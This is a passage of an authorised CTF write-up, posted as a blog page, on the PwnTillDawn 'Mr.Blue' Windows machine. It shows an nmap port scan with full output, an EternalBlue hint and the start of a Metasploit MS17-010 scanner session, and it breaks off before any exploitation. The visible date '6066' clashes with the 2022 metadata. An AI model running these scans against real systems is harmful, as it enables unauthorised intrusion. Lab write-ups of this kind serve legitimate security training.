@@ -1,0 +1,1290 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Mr.Blue machine in PwnTillDawn Online platform.'><title>Mr.Blue PwnTillDawn Writeup</title>
+
+<link rel='canonical' href='https://AbdallahAdham.com/p/mr.blue-pwntilldawn-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Mr.Blue PwnTillDawn Writeup'>
+<meta property='og:description' content='This is a writeup of the Mr.Blue machine in PwnTillDawn Online platform.'>
+<meta property='og:url' content='https://AbdallahAdham.com/p/mr.blue-pwntilldawn-writeup/'>
+<meta property='og:site_name' content='Abdallah Adham'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PwnTillDawn' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-12-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-06T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG' />
+<meta name="twitter:title" content="Mr.Blue PwnTillDawn Writeup">
+<meta name="twitter:description" content="This is a writeup of the Mr.Blue machine in PwnTillDawn Online platform."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu75263645e29a61b75309ab4d02f07e73_73571_300x0_resize_q75_box.jpg" width="300"
+                            height="249" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Abdallah Adham</a></h1>
+            <h2 class="site-description">Penetration Tester</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/AbdallahAdham'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg width="16px" height="16px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.976 0A7.977 7.977 0 000 7.976c0 3.522 2.3 6.507 5.431 7.584.392.049.538-.196.538-.392v-1.37c-2.201.49-2.69-1.076-2.69-1.076-.343-.93-.881-1.175-.881-1.175-.734-.489.048-.489.048-.489.783.049 1.224.832 1.224.832.734 1.223 1.859.88 2.3.685.048-.538.293-.88.489-1.076-1.762-.196-3.621-.881-3.621-3.964 0-.88.293-1.566.832-2.153-.05-.147-.343-.978.098-2.055 0 0 .685-.196 2.201.832.636-.196 1.322-.245 2.007-.245s1.37.098 2.006.245c1.517-1.027 2.202-.832 2.202-.832.44 1.077.146 1.908.097 2.104a3.16 3.16 0 01.832 2.153c0 3.083-1.86 3.719-3.62 3.915.293.244.538.733.538 1.467v2.202c0 .196.146.44.538.392A7.984 7.984 0 0016 7.976C15.951 3.572 12.38 0 7.976 0z" fill="#000"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/abdallah-adham/'
+                        target="_blank"
+                        title="Linkedin"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_801_">
+	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73
+		C77.16,101.969,74.922,99.73,72.16,99.73z"/>
+	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4
+		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>
+	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599
+		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319
+		c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995
+		C310,145.43,300.549,94.761,230.454,94.761z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/AbdallahAdham13'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_826_">
+	<path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73
+		c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783
+		c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598
+		C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467
+		c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977
+		c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889
+		c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597
+		c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961
+		c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895
+		c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367
+		c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998
+		C307.394,57.037,305.009,56.486,302.973,57.388z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/mr.blue-pwntilldawn-writeup/">
+                
+                    <img src="/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG" loading="lazy" alt="Featured image of post Mr.Blue PwnTillDawn Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pen-testing/" style="background-color: #2a9d8f; color: #fff;">
+                Pen-Testing
+            </a>
+        
+            <a href="/categories/web-security/" style="background-color: #2a9d8f; color: #fff;">
+                Web-Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/mr.blue-pwntilldawn-writeup/">Mr.Blue PwnTillDawn Writeup</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            This is a writeup of the Mr.Blue machine in PwnTillDawn Online platform.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">July 12, 6066</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<p>This writeup has been authorized by the <strong>PwnTillDawn Crew</strong>!</p>
+<p>Check their websites for more information!</p>
+<ol>
+<li><a class="link" href="https://www.wizlynxgroup.com/"  target="_blank" rel="noopener"
+    >wizlynxgroup</a></li>
+<li><a class="link" href="https://online.pwntilldawn.com/"  target="_blank" rel="noopener"
+    >online.pwntilldawn</a></li>
+</ol>
+<h2 id="target-information">Target Information</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Name</th>
+<th>IP</th>
+<th>Operating System</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Mr. Blue</strong></td>
+<td><strong>10.150.150.242</strong></td>
+<td><strong>Windows</strong></td>
+<td><strong>Easy</strong></td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap-scanning">Nmap Scanning</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p- -A 10.150.150.242
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-05 23:32 EST
+</span></span><span class="line"><span class="cl">Stats: 0:00:06 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.150.150.242
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.060s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65519</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain       Microsoft DNS 6.1.7601 <span class="o">(</span>1DB1446A<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB1446A<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http         Microsoft IIS httpd 7.5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/7.5
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1433/tcp  open  ms-sql-s     Microsoft SQL Server <span class="m">2012</span> 11.00.2100.00<span class="p">;</span> RTM
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2022-12-06T05:15:43+00:00<span class="p">;</span> +40m45s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-03-25T14:11:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2050-03-25T14:11:19
+</span></span><span class="line"><span class="cl">8089/tcp  open  ssl/http     Splunkd httpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: splunkd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2019-10-25T09:53:52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-10-24T09:53:52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Splunkd
+</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49156/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49157/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49158/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49197/tcp open  ms-sql-s     Microsoft SQL Server <span class="m">2012</span> 11.00.2100.00<span class="p">;</span> RTM
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2022-12-06T05:15:43+00:00<span class="p">;</span> +40m45s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-03-25T14:11:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2050-03-25T14:11:19
+</span></span><span class="line"><span class="cl">Service Info: Host: MRBLUE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2022-12-06T05:15:35
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2020-03-25T14:11:23
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   210: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_nbstat: NetBIOS name: MRBLUE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000c29ab4629 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 Enterprise 6.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: MrBlue
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: MRBLUE<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2022-12-06T05:15:35+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 40m44s, deviation: 0s, median: 40m44s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 151.59 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="enumeration">Enumeration</h2>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p><img src="/post/Mr.Blue_PwnTillDawn/imgs/1.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http"
+	
+	
+></p>
+<p>This image maybe a hint that this machine is vulnerable to the famous <strong>EternalBlue</strong> vulnerability, Also from the <strong>Nmap</strong> scanning report we saw that the machine is called <strong>MrBlue</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: MrBlue
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: MRBLUE<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, Let&rsquo;s get to the <strong>SMB Enumeration</strong> to see if it is really vulnerable or not!</p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>We can check if the machine is vulnerable to <strong>EternalBlue</strong> or not by using <strong>Metasploit</strong> framework.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; options
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>auxiliary/scanner/smb/smb_ms17_010<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">   Name         Current Setting                          Required  Description
+</span></span><span class="line"><span class="cl">   ----         ---------------                          --------  -----------
+</span></span><span class="line"><span class="cl">   CHECK_ARCH   <span class="nb">true</span>                                     no        Check <span class="k">for</span> architecture on vulnerable hosts
+</span></span><span class="line"><span class="cl">   CHECK_DOPU   <span class="nb">true</span>                                     no        Check <span class="k">for</span> DOUBLEPULSAR on vulnerable hosts
+</span></span><span class="line"><span class="cl">   CHECK_PIPE   <span class="nb">false</span>                                    no        Check <span class="k">for</span> named pipe on vulnerable hosts
+</span></span><span class="line"><span class="cl">   NAMED_PIPES  /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
